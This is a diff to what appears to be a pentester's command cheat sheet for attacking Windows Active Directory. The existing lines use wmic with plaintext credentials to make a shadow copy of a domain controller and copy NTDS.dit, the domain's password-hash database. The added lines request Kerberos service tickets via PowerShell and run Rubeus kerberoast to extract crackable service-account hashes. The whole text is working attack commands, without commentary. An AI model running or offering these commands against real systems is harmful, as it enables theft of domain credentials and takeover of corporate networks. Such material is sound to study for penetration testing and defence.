@@ -104,6 +104,16 @@
 -> wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
 -> wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
 
+* request kerberos tickets
+-> Add-Type -AssemblyName System.IdentityModel
+-> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
+
+* rubeus kerberoast
+-> .\.rubeus.exe kerberoast /creduser:domain\user /credpassword:password
+
+* list running process
+-> tasklist /SVC
+
 
 
 
